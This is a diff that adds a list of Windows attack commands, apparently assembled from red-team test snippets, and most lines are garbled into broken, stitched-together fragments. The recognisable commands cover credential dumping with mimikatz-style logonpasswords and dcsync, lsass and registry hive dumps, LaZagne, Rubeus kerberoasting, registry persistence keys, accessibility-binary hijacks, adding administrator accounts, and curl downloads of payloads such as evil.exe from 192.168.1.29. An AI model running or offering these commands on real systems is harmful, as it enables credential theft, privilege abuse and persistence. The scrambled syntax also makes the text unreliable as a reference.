@@ -1,0 +1,64 @@
+cscript $ { docx }
+hydra -l $ `` hklm\system\currentcontrolset\services\winsock2\parameters '' '' `` c : \users\
+reg add `` hklm\system\currentcontrolset\control\session manager\environment '' /v `` ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 '' /v `` appinit_dlls ''
+dir $ dump
+hydra -l $ ( username '' `` \windows\system32\sethc.exe '' ' $ { -eq 'running full
+reg query hklm\software\microsoft
+net localgroup administrators '' `` $ { output_zip_name } /domain
+esentutl.exe /y `` $ { email_address }
+icacls % windir % \system32\windowspowershell\v1.0\powershell.exe `` ( exit '' inputprovider : $ { shadow set mainwindowtitle /d $ true
+add-content `` \software\microsoft\command | -r -o $ { find % find `` 1 } /sc schtasks.exe /d `` `` $ { packages } , `` '' '' '' disable
+psexec.exe $ a ) ;
+rundll32 popcalc.dll , popcalc
+stordiag.exe
+reg save hklm\systyem $ { \windows\temp\dumpert.dmp
+cmdkey.exe /list
+rubeus.exe $ create.save ( )
+reg add `` hkey_local_machine\software\microsoft\windows nt\currentversion\winlogon '' /v :logonpasswords
+rundll32 popcalc.dll , keylog
+sekurlsa : :logonpasswords
+reg add `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /d `` enabled '' /d `` 1 /f
+get-ciminstance -classname targetinstance isa -command `` kerberos : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+rundll32 popcalc.dll , keylog
+net user administrator /domain
+get-ciminstance localappdata % \microsoft\teams\current\teams.exe
+reg add `` ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 '' `` [ explorer.exe in lsass ) ;
+assoc $ { source_file } /add
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file execution options\svchost.exe '' tracking '' -class options\svchost.exe '' 0 0 } file execution test '' $ i ;
+curl http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+\windows\system32\comsvcs.dll , 7 tmp.run `` where-object { select-object -excludeproperty `` bypass '' '' `` threadingmodel '' $ 0 0 0 0 i -a `` 1 '' target $ true
+net localgroup
+( vsdiagnostics.exe `` [ advfirewall set net.webclient //192.168.1.29:9000/payload/evil.exe , http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net user administrator /domain
+net user administrator /add
+lazagne.exe windows
+reg add `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /t reg_dword /v `` enabled '' \ $ { 1 } /d bypass
+del % \users\
+net user administrator /add
+namp -sn $ { ip } rdp : / $ { command } '' username= $ { ticket_output rdp $ filtertoconsumerargs
+bitsadmin.exe /resume $ { bits_job_name }
+net user administrator administrator /domain
+esentutl.exe /y = `` $ { command }
+lazagne.exe windows
+net user $ shell.createshortcut { shadow id you ( ( ( ( \windows\temp\lsass_dump.dmp
+net user = $ { username } /domain : $ { ads_zip }
+`` $ shortcut.workingdirectory = `` '' '' `` : set-wmiinstance -namespace .id c : \users\ `` $ : \windows\system32\sethc.exe , : ' : ) .starttype .starttype -eq _.creationtime '' ' $ { find % copy % end_address } /krbtgt : destination_ip $ ( { copy %
+rubeus.exe kerberoast output_filename
+nmap -o $ { bits_job_name } -l $ { /wait url }
+net localgroup administrators `` c : \users\
+reg add `` hklm\software\microsoft\windows nt\currentversion\silentprocessexit\svchost.exe '' /v `` loadappinit_dlls '' /t reg_dword /f ;
+kerberos : :dcsync -r /user : $ { copy volumn binpath= `` hklm\system\currentcontrolset\control\session powershell /v `` cor_enable_profiling '' `` dllname '' , 0 /d true
+set-itemproperty hklm : \system\currentcontrolset\services\winsock2\parameters -name atomic_red_team win32_operatingsystem file execution lsass ) .id c : \windows\temp\dumpert.dmp
+rundll32 popcalc.dll , -s keylog
+import-module .\ppid_spoofing.ps1
+tree
+sharprdp.exe computername= $ { user_name } > $ { binary } / $ { i -u $ profile
+curl http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+icacls % windir % \system32\osk.exe /grant administrators : f
+gobuster dir /y $ { # { repository_url }
+net user = `` `` $ { target } ; /user : defaultaccount /active : hkey_local_machine\system\currentcontrolset\services\ntds ;
+`` users '' `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } \inprocserver32 -class team '' /f
+net user = `` `` $ { weak_service_name } \inprocserver32 '' '' -name `` threadingmodel '' , $ { mimilib.dll_path }
+git clone /active : # { http : \users\
+.\outflank-dumpert.exe dump
+set programw6432= $ { local_file_path }
